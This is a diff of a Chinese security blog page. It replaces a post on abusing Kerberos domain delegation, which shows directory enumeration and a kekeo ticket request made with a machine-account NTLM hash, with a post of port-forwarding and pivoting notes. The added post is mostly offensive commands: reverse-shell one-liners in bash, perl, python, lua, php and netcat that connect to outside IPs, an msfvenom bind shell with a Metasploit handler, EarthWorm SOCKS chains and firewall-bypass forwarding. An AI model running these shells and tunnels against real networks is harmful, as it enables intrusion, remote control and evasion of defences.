@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="PowerShell,域委派,TGS票据," />
+  <meta name="keywords" content="笔记,端口转发," />
 
 
 
@@ -89,24 +89,17 @@
 
 
 <meta name="description" content="…..">
-<meta name="keywords" content="PowerShell,域委派,TGS票据">
+<meta name="keywords" content="笔记,端口转发">
 <meta property="og:type" content="article">
-<meta property="og:title" content="利用域委派获取域某些权限">
-<meta property="og:url" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/index.html">
+<meta property="og:title" content="端口转发总结">
+<meta property="og:url" content="https://sp4rr0w.github.io/2018/01/20/端口转发总结/index.html">
 <meta property="og:site_name" content="Sparrow&#39;s Blog">
 <meta property="og:description" content="…..">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/delegation.png">
-<meta property="og:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/computerproperty.png">
-<meta property="og:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/testwin10.png">
-<meta property="og:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/kekeo.png">
-<meta property="og:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/cfis1.png">
-<meta property="og:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/cfis2.png">
-<meta property="og:updated_time" content="2018-04-08T09:00:09.882Z">
+<meta property="og:updated_time" content="2018-04-08T09:36:57.782Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="利用域委派获取域某些权限">
+<meta name="twitter:title" content="端口转发总结">
 <meta name="twitter:description" content="…..">
-<meta name="twitter:image" content="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/delegation.png">
 
 
 
@@ -136,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/"/>
+  <link rel="canonical" href="https://sp4rr0w.github.io/2018/01/20/端口转发总结/"/>
 
 
 
 
 
-  <title>利用域委派获取域某些权限 | Sparrow's Blog</title>
+  <title>端口转发总结 | Sparrow's Blog</title>
   
 
 
@@ -313,7 +306,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/01/13/利用域委派获取域某些权限/">
+    <link itemprop="mainEntityOfPage" href="https://sp4rr0w.github.io/2018/01/20/端口转发总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Sparrow">
@@ -330,7 +323,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">利用域委派获取域某些权限</h1>
+          <h1 class="post-title" itemprop="name headline">端口转发总结</h1>
         
 
         <div class="post-meta">
@@ -342,8 +335,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-13T10:13:00-05:00">
-                2018-01-13
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-20T16:58:00-05:00">
+                2018-01-20
               </time>
             
 
@@ -383,8 +376,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/01/13/利用域委派获取域某些权限/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2018/01/13/利用域委派获取域某些权限/" itemprop="commentCount"></span>
+                <a href="/2018/01/20/端口转发总结/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/01/20/端口转发总结/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -392,7 +385,7 @@
 
           
           
-             <span id="/2018/01/13/利用域委派获取域某些权限/" class="leancloud_visitors" data-flag-title="利用域委派获取域某些权限">
+             <span id="/2018/01/20/端口转发总结/" class="leancloud_visitors" data-flag-title="端口转发总结">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -429,270 +422,272 @@
 
       
         <p>…..<br><a id="more"></a></p>
-<h2 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h2><p>将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
-<p>域内委派主要有3种应用方式：</p>
-<pre><code>一. 非约束性委派Unconstrained Delegation 
-    服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。
-    举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。
-    从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。
-二. 约束性委派Constrained Delegation
-    即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；
-三. 协议传递
-    即Kerberos的扩展协议S4U2Self，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。
-</code></pre><p>在Windows系统中，普通用户的属性中没有委派Delegation这个选项卡，只有服务账号、主机账号才有</p>
-<pre><code>WIN10-NEW$ ： 192.168.19.8        加入域 DEMO.LOCAL
-owa2010dc$   ： 192.168.19.10    域服务器：DEMO.LOCAL
-testwin10 : 域用戶
-</code></pre><p>在域DEMO.LOCAL上设置WIN10-NEW$的delegation(在Service Manager -&gt; Roles -&gt; demo.local的computers里找到WIN10-NEW$右键设置)，</p>
-<pre><code>--&gt; Trust the computer for delegation to specified service only
-    --&gt; Use any authentication protocol
-        --&gt; 点击add -&gt; 点击find now 
-            --&gt; owa2010dc(域机器名) -&gt;ok-&gt;ok
-                --&gt; 选取cifs协议(共享)
-</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/delegation.png" alt="delegation"></p>
-<p>查询服务账户(或者机器账号)的域委派权限方法</p>
-<pre><code>ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;*&quot;
-ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;cn,givenName,displayname,samAccountName,mail,department,title,description,scriptPath&quot;
-</code></pre><p>因为ldifde導出的WIN10-NEW机器账号： </p>
-<pre><code>userAccountControl: 16781312
-WORKSTATION_TRUST_ACCOUNT : 4096
-TRUSTED_FOR_DELEGATION : 16777216
-==&gt; 16777216 + 4096 = 16781312
-</code></pre><p>根据<a href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx</a>  符合规则。</p>
-<pre><code>属性标志 十进制
-SCRIPT                                  = 1,        // 0x1
-ACCOUNTDISABLE                          = 2,        // 0x2
-HOMEDIR_REQUIRED                        = 8,        // 0x8
-LOCKOUT                                 = 16,       // 0x10
-PASSWD_NOTREQD                          = 32,       // 0x20
-PASSWD_CANT_CHANGE                      = 64,       // 0x40
-ENCRYPTED_TEXT_PASSWORD_ALLOWED         = 128,      // 0x80
-TEMP_DUPLICATE_ACCOUNT                  = 256,      // 0x100
-NORMAL_ACCOUNT                          = 512,      // 0x200
-INTERDOMAIN_TRUST_ACCOUNT               = 2048,     // 0x800
-WORKSTATION_TRUST_ACCOUNT               = 4096,     // 0x1000
-SERVER_TRUST_ACCOUNT                    = 8192,     // 0x2000
-DONT_EXPIRE_PASSWD                      = 65536,    // 0x10000
-MNS_LOGON_ACCOUNT                       = 131072,   // 0x20000
-SMARTCARD_REQUIRED                      = 262144,   // 0x40000
-TRUSTED_FOR_DELEGATION                  = 524288,   // 0x80000
-NOT_DELEGATED                           = 1048576,  // 0x100000
-USE_DES_KEY_ONLY                        = 2097152,  // 0x200000
-DONT_REQUIRE_PREAUTH                    = 4194304,  // 0x400000
-PASSWORD_EXPIRED                        = 8388608,  // 0x800000
-TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION  = 16777216 // 0x1000000
-</code></pre><p>或者通过<code>PowerView</code>的Get-DomainUser,查看userAccountControl是否包含 TRUSTED_FOR_DELEGATION</p>
-<pre><code>PS C:\PowerSploit-dev\Recon&gt; Get-DomainUser testwin10 -Properties userAccountControl,msds-allowedtodelegateto | fl
-useraccountcontrol : NORMAL_ACCOUNT, TRUSTED_FOR_DELEGATION
-</code></pre><p>或者<code>PowerView</code>的Get-DomainComputer(<a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>  ) ：<br>通过PowerShell脚本枚举域内所有的机器账号，查看哪些账号被设置了<code>委派</code>，以及是何种类型的委派设置(获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegatetol)：</p>
-<pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
-distinguishedname        : CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local
-msds-allowedtodelegateto :
-name                     : OWA2010DC
-useraccountcontrol       : 532480
+<h2 id="传统反弹与网络发现"><a href="#传统反弹与网络发现" class="headerlink" title="传统反弹与网络发现"></a>传统反弹与网络发现</h2><p><strong>协议的判断</strong></p>
+<p>主要是看能够通过什么协议出去，主要有tcp\http\dns\icmp等协议。常见判断手法如下：</p>
+<p>tcp协议</p>
+<pre><code>外网vps : nc –lvp port
+内网机器：nc ip port
+</code></pre><p>dns协议</p>
+<pre><code>外网vps: nc –u –lvp 53
+内网机器:
+windows: nslookup www.baidu.com vps-ip
+linux：dig @vps-ip www.baidu.com
+</code></pre><p>http协议</p>
+<pre><code>外网vps : nc –lvp 80 (or 8080等)
+内网机器 ： curl vps-ip:8080
+</code></pre><p>icmp协议</p>
+<pre><code>外网vps：抓包、tcpdump icmp
+内网机器:直接ping
+</code></pre><p><strong>端口的判断</strong></p>
+<p>外网vps做监听，内网机器测试常见端口，或直接使用端口扫描器进行扫描。</p>
+<p>常见能出去的端口有80,8080,443,53,110,123等。</p>
+<p><strong>额外情况–代理服务器</strong><br>还有一种是机器不能直接出来的，需要进行代理设置，这种多数是为了办公网段得办公人员进行上网用的。</p>
+<p>常用的判断手法与情况如下：</p>
+<pre><code>查看网络连接看是否有连接其他机器的8080（不绝对）等端口，尝试ping –n 1 –a ip
+是否有hostname类似于proxy的机器
+IE直接代理情况
+</code></pre><p>可以通过查询注册表得到：</p>
+<pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer
+reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;
+</code></pre><p>通过pac文件自动代理情况</p>
+<pre><code>reg query &quot;HKEY_USERS\[SID]\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL
+</code></pre><p>我们可以通过pac文件的路径（可能是本地路径或远程路径）将pac文件下载回来查看，例如某pac文件如下：从中我们能看到其带来服务器为172.16.10.168:8080</p>
+<pre><code>    function islocalip(ip) {
+           return isInNet(ip, &quot;127.0.0.0&quot;, &quot;255.0.0.0&quot;) ||
+                     isInNet(ip, &quot;169.254.0.0&quot;, &quot;255.255.0.0&quot;) ||
+                     isInNet(ip, &quot;10.0.0.0&quot;, &quot;255.0.0.0&quot;) ||
+                     isInNet(ip, &quot;192.168.0.0&quot;, &quot;255.255.0.0&quot;) ||
+                     }
+    function FindProxyForURL(url, host) {
+           var DefaultScanner = &quot;PROXY 172.16.10.168:8080; DIRECT&quot;;
+           var target_ip = dnsResolve(host);
+           if (islocalip(target_ip)) {
+                         return &#39;DIRECT&#39;;
+           } else {
+                  return DefaultScanner;
+           }
+    }
+</code></pre><p>最终我们可以利用curl进行确定：</p>
+<pre><code>curl        www.baidu.com      //不通 
+curl –x     proxy-ip:8080 www.baidu.com   //通
+icmp        ping baidu.com 
+http        curl -i  baidu.com 
+tcp         telnet baidu.com 
+dns         nslookup baidu.com    //当然这里不一定非要百度
+</code></pre><p>其他反弹</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre><p>顺便提下</p>
+<pre><code>searchsploit ms17  |grep py  只匹配py脚本
+searchsploit -p 41891.rb 复制完整路径并显示详细信息
+searchsploit -m 41891.rb 复制到当前目录
+searchsploit -w ms17-010  显示exploit-db在线结果
+</code></pre><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
 
-distinguishedname        : CN=OWA2010,CN=Computers,DC=demo,DC=local
-msds-allowedtodelegateto :
-name                     : OWA2010
-useraccountcontrol       : 4096
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
 
-distinguishedname        : CN=WIN10-NEW,CN=Computers,DC=demo,DC=local
-msds-allowedtodelegateto : {cifs/OWA2010DC.demo.local/demo.local, cifs/OWA2010DC.demo.local, cifs/OWA2010DC, cifs/OWA20
-                           10DC.demo.local/DEMO...}
-name                     : WIN10-NEW
-useraccountcontrol       : 16781312
-</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/computerproperty.png" alt="computerproperty"></p>
-<p>或者PowerView的Get-UserProperty(通过PowerShell脚本枚举域内所有的用戶账号)：</p>
-<pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl
-name                     : Administrator
-distinguishedname        : CN=Administrator,CN=Users,DC=demo,DC=local
-useraccountcontrol       : 66048
-msds-allowedtodelegateto :
+lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
 
-name                     : Guest
-distinguishedname        : CN=Guest,CN=Users,DC=demo,DC=local
-useraccountcontrol       : 66082
-msds-allowedtodelegateto :
+mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
 
-name                     : krbtgt
-distinguishedname        : CN=krbtgt,CN=Users,DC=demo,DC=local
-useraccountcontrol       : 514
-msds-allowedtodelegateto :
+php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</code></pre><h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>1、编辑配置文件/etc/sysctl.conf</p>
+<pre><code>net.ipv4.ip_forward = 1
+</code></pre><p>2、关闭服务</p>
+<pre><code>service iptables stop
+</code></pre><p>3、配置规则</p>
+<p>需要访问的内网地址：192.168.206.101<br>内网边界web服务器：192.168.206.129</p>
+<pre><code>iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389
+iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129
+</code></pre><p>4、保存&amp;&amp;重启服务</p>
+<pre><code>service iptables save &amp;&amp; service iptables start
+</code></pre><h2 id="EarthWorm-绕防火墙"><a href="#EarthWorm-绕防火墙" class="headerlink" title="EarthWorm[绕防火墙]"></a>EarthWorm[绕防火墙]</h2><p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a></p>
+<ol>
+<li><p>正向 SOCKS v5 服务器</p>
+<p> $ ./ew -s ssocksd -l 1080</p>
+</li>
+<li><p>反弹 SOCKS v5 服务器<br>这个操作具体分两步：</p>
+<p> a) 先在一台具有公网 ip 的主机A上运行以下命令：</p>
+<pre><code> $ ./ew -s rcsocks -l 1080 -e 8888 
+</code></pre><p> b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
+<pre><code> $ ./ew -s rssocks -d 1.1.1.1 -e 8888 
+</code></pre></li>
+<li><p>多级级联</p>
+</li>
+</ol>
+<p>工具中自带的三条端口转发指令，<br>它们的参数格式分别为：</p>
+<pre><code>$ ./ew -s lcx_listen -l  1080   -e 8888
+$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999
+$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999
+</code></pre><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。<br>首先提供两个“二级级联”本地SOCKS测试样例：</p>
+<pre><code>a) lcx_tran 的用法
+    $ ./ew -s ssocksd  -l 9999
+    $ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
+b) lcx_listen、lcx_slave 的用法
+    $ ./ew -s lcx_listen -l 1080 -e 8888
+    $ ./ew -s ssocksd    -l 9999
+    $ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+</code></pre><p> 再提供一个“三级级联”的本地SOCKS测试用例以供参考</p>
+<pre><code>$ ./ew -s rcsocks -l 1080 -e 8888
+$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
+$ ./ew -s lcx_listen -l 9999 -e 7777
+$ ./ew -s rssocks -d 127.0.0.1 -e 7777
+</code></pre><p>数据流向: SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
+<h2 id="Shell反弹不出-DMZ"><a href="#Shell反弹不出-DMZ" class="headerlink" title="Shell反弹不出[DMZ]"></a>Shell反弹不出[DMZ]</h2><p>1、先生成一个bind_shell</p>
+<pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=12345 -f exe -o ./shell.exe
+</code></pre><p>2、本地利用tunna工具进行端口转发</p>
+<pre><code>python proxy.py -u http://xxxx.com/conn.jsp  -l 3333 -r 12345 v
+</code></pre><p>3、监听</p>
+<pre><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 3333
+</code></pre><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>三种不同类型的ssh隧道</p>
+<p><a href="http://hetaoo.iteye.com/blog/2299123" target="_blank" rel="noopener">http://hetaoo.iteye.com/blog/2299123</a></p>
+<p>通过VPS SSH隧道使用本地msf<br><a href="https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html" target="_blank" rel="noopener">https://evi1cg.me/archives/Port_Forward_using_VPS_SSH_Tunnel.html</a></p>
+<p>本地访问127.0.0.1:port1就是host:port2(用的更多)</p>
+<pre><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发
+</code></pre><p>访问host:port2就是访问127.0.0.1:port1</p>
+<pre><code>ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发
+</code></pre><p>可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</p>
+<pre><code>ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port
+</code></pre><p>可以将dmz_host的hostport端口转发到remote_ip的port端口</p>
+<pre><code>ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip  
+</code></pre><p>socket代理</p>
+<pre><code>ssh -qTfnN -D port remotehost
+</code></pre><p>反向隧道，用于内网穿透防火墙限制之类</p>
+<pre><code>-q      #安静模式
+-T      #不占用shell
+-f      #后台运行，推荐加-n参数
+-N      #不执行远程命令
+</code></pre><p>set RHOST 127.0.0.1</p>
+<h2 id="Netsh-tcp"><a href="#Netsh-tcp" class="headerlink" title="Netsh[tcp]"></a>Netsh[tcp]</h2><p>添加转发规则</p>
+<pre><code>netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389
 
-name                     : testwin10
-distinguishedname        : CN=testwin10,CN=Users,DC=demo,DC=local
-useraccountcontrol       : 524800
-msds-allowedtodelegateto :
-</code></pre><p>或者 (获取机器的所有SPN信息 包括useraccountcontrol,msds-allowedtodelegateto)</p>
-<pre><code>C:\Users\Administrator&gt;dsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontrol
-serviceprincipalname: kadmin/changepw
-name: krbtgt
-samaccountname: krbtgt
-memberof: CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local
-pwdlastset: 131182114793700226
-distinguishedname: CN=krbtgt,CN=Users,DC=demo,DC=local
-useraccountcontrol: 514
-serviceprincipalname: test/test
-name: testwin10
-samaccountname: testwin10
-memberof:
-pwdlastset: 131602140228263620
-distinguishedname: CN=testwin10,CN=Users,DC=demo,DC=local
-useraccountcontrol: 524800
-</code></pre><p>或者 PowerShell脚本枚举域帐户的SPN</p>
-<p>GetUserSPNs - kerberoast<br><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
-<pre><code>PS C:\Users\Administrator\Desktop\kerberoast&gt; . .\GetUserSPNs.ps1
-ServicePrincipalName : kadmin/changepw
-Name                 : krbtgt
-SAMAccountName       : krbtgt
-MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local
-PasswordLastSet      : 9/13/2016 11:37:59 AM
+此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389
+</code></pre><p>删除转发规则</p>
+<pre><code>netsh interface portproxy delete v4tov4 listenport=9090
+</code></pre><p>查看现有规则</p>
+<pre><code>netsh interface portproxy show all
+</code></pre><p>xp需要安装ipv6</p>
+<pre><code>netsh interface ipv6 install
+</code></pre><h2 id="nc-正向"><a href="#nc-正向" class="headerlink" title="nc [正向]"></a>nc [正向]</h2><pre><code>1、 nc -e /bin/sh -lp 1234
+    nc -e /bin/sh 223.8.200.234 1234
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f 
+    nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
 
-ServicePrincipalName : test/test
-Name                 : testwin10
-SAMAccountName       : testwin10
-MemberOf             :
-PasswordLastSet      : 1/12/2018 3:00:22 PM
-</code></pre><p>Get-NetUser - PowerView</p>
-<pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-NetUser -spn
-objectsid              : S-1-5-21-1239069908-882060383-2558203358-502
-iscriticalsystemobject : True
-samaccounttype         : 805306368
-primarygroupid         : 513
-instancetype           : 4
-badpasswordtime        : 1/1/1601 8:00:00 AM
-lastlogoff             : 1/1/1601 8:00:00 AM
-whenchanged            : 1/12/2018 6:32:42 AM
-badpwdcount            : 0
-useraccountcontrol     : 514
-usncreated             : 12324
-countrycode            : 0
-admincount             : 1
-objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local
-objectclass            : {top, person, organizationalPerson, user}
-logoncount             : 0
-lastlogon              : 1/1/1601 8:00:00 AM
-serviceprincipalname   : kadmin/changepw
-adspath                : LDAP://CN=krbtgt,CN=Users,DC=demo,DC=local
-dscorepropagationdata  : {1/12/2018 6:32:42 AM, 9/13/2016 4:06:37 AM, 9/13/2016 3:53:08 AM, 1/1/1601 12:00:00 AM}
-distinguishedname      : CN=krbtgt,CN=Users,DC=demo,DC=local
-cn                     : krbtgt
-pwdlastset             : 9/13/2016 11:37:59 AM
-objectguid             : 547b1f4b-4f25-4a4f-96e9-2480d6f2e896
-whencreated            : 9/13/2016 3:37:59 AM
-description            : Key Distribution Center Service Account
-samaccountname         : krbtgt
-showinadvancedviewonly : True
-memberof               : CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=local
-accountexpires         : 9223372036854775807
-usnchanged             : 28705
-name                   : krbtgt
-codepage               : 0
-objectsid             : S-1-5-21-1239069908-882060383-2558203358-1126
-samaccounttype        : 805306368
-primarygroupid        : 513
-instancetype          : 4
-badpasswordtime       : 1/17/2018 8:47:37 PM
-accountexpires        : 0
-whenchanged           : 1/13/2018 3:43:54 AM
-badpwdcount           : 0
-useraccountcontrol    : 524800
-name                  : testwin10
-codepage              : 0
-objectclass           : {top, person, organizationalPerson, user}
-logoncount            : 23
-lastlogon             : 1/18/2018 7:37:12 AM
-serviceprincipalname  : test/test
-usncreated            : 32796
-dscorepropagationdata : {1/13/2018 3:43:54 AM, 1/1/1601 12:00:00 AM}
-distinguishedname     : CN=testwin10,CN=Users,DC=demo,DC=local
-cn                    : testwin10
-pwdlastset            : 1/12/2018 3:00:22 PM
-objectguid            : 2d8ce475-2bd9-4827-a3ed-6e8b4695d516
-whencreated           : 1/12/2018 7:00:22 AM
-samaccountname        : testwin10
-countrycode           : 0
-objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=demo,DC=local
-adspath               : LDAP://CN=testwin10,CN=Users,DC=demo,DC=local
-usnchanged            : 33123
-lastlogoff            : 1/1/1601 8:00:00 AM
-lastlogontimestamp    : 1/12/2018 3:00:40 PM
-</code></pre><p>或者 (使用dsquery获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegateto)</p>
-<pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegateto
-  cn           operatingSystem                      distinguishedName                                      useraccountcontrol    msds-allowedtodelegateto
-  OWA2010DC    Windows Server 2008 R2 Datacenter    CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=local    532480
-  OWA2010      Windows Server 2008 R2 Datacenter    CN=OWA2010,CN=Computers,DC=demo,DC=local               4096
-  WIN10-NEW    Windows 10 Enterprise 2016 LTSB      CN=WIN10-NEW,CN=Computers,DC=demo,DC=local             16781312              cifs/OWA2010DC.demo.local/demo.local;cifs/OWA2010DC.demo.local;cifs/OWA2010DC;cifs/OWA2010DC.demo.local/DEMO;cifs/OWA2010DC/DEMO;
-</code></pre><p>或者 (获取用戶某些信息 包括useraccountcontrol)</p>
-<pre><code>C:\Users\Administrator&gt;dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto
-  cn             distinguishedName                             useraccountcontrol        msds-allowedtodelegateto
-  Administrator  CN=Administrator,CN=Users,DC=demo,DC=local 66048
-  Guest          CN=Guest,CN=Users,DC=demo,DC=local         66082
-  krbtgt         CN=krbtgt,CN=Users,DC=demo,DC=local         514
-  testwin10      CN=testwin10,CN=Users,DC=demo,DC=local     524800
-</code></pre><p>测试主机为域内Windows 10系统，现在以普通域用户testwin10登录系统，IPC方式连接域服务器，访问域服务器的C盘目录，显示被拒绝，权限不够。</p>
-<p>C:\Users\testwin10&gt;whoami</p>
-<pre><code>demo\testwin10
-</code></pre><p>C:\Users\testwin10&gt;dir \owa2010dc.demo.local\c$</p>
-<pre><code>Access is denied.
-</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/testwin10.png" alt="testwin10"></p>
-<p>现在已知域内机器账号的口令(计算机的机器账号密码默认是随机的，每30天轮换一次)，则可使用kekeo工具构造WIN10-NEW机器账号的票据。命令和执行结果如下</p>
-<pre><code>tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b
-</code></pre><p>已知域内主机账号(机器账号WIN10-NEW$)，使用kekeo工具构造该主机账号的TGT票据 ： </p>
-<pre><code>(如果是服务账号的话命令就是：tgt::ask /user:sqlsrv /domain:demo.local /password:xxx /ticket:sqlsrv.kirbi)
-kekeo # tgt::ask /user:WIN10-NEW$ /domain:demo.local /NTLM:5b8303606d3478a49e47650272fea13b
-Realm        : demo.local (demo)
-User         : WIN10-NEW$ (WIN10-NEW$)
-CName        : WIN10-NEW$       [KRB_NT_PRINCIPAL (1)]
-SName        : krbtgt/demo.local        [KRB_NT_SRV_INST (2)]
-Need PAC     : Yes
-Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 5b8303606d3478a49e47650272fea13b
-[kdc] name: OWA2010DC.demo.local (auto)
-[kdc] addr: 192.168.18.10 (auto)
-  Ticket in file &#39;TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi&#39;
+2、  mknod /tmp/backpipe p
+    /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe
 
-使用kekeo工具构造该主机账号的TGT票据
